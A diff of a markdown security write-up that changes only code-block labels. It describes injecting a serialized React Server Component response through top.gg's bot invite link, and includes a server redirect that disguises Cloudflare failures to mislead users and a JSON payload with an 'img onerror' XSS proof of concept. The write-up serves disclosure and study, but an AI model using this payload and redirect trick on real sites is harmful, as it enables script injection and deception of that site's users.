@@ -14,7 +14,7 @@ So, I noticed that you can set any link for the bot invite, which is the one tha
 
 Seems innocent, but I noticed that when you click the button, the frontend was prefetching the link rather than just redirecting to it:
 
-```http
+```http - Request inspector
 GET /bot/[bot_id]/invite?_rsc=AnZnK6Nm6TZijOb5 HTTP/1.1
 Host: top.gg
 Accept: */*
@@ -31,7 +31,7 @@ If you read the [Dank Memer](/content_injection/dank_memer.md) case, you might k
 
 But there's a small catch, and it's that the route most times will trigger the Cloudflare's bot verification page, thus returning a `403 Forbidden` and making the preflight request fail, but we can edit the server code to just redirect the user to the top.gg page again, and they will think that it was by the bot verification:
 
-```js
+```js - code.js
 if(req.get("Rsc") !== "1" && req.method != "OPTIONS"){
     return res.redirect(303, `https://top.gg/bot/${BOT_ID}`);
 }
@@ -39,7 +39,7 @@ if(req.get("Rsc") !== "1" && req.method != "OPTIONS"){
 
 Now, taking a serialized response from the own site (as example, `https://top.gg/discord/news?_rsc=AnZnK6Nm6TZijOb5`) and setting it as response in my server, will make the `Invite` button render the news page. As I have total control of the serialized data, I can now add this funny thing:
 
-```json
+```json - payload.rsc
 ["$", "div", null, {"dangerouslySetInnerHTML":{"__html":"<img src=x onerror='alert(`1`);'>"},"data-cfasync":"false"}]
 ```
 
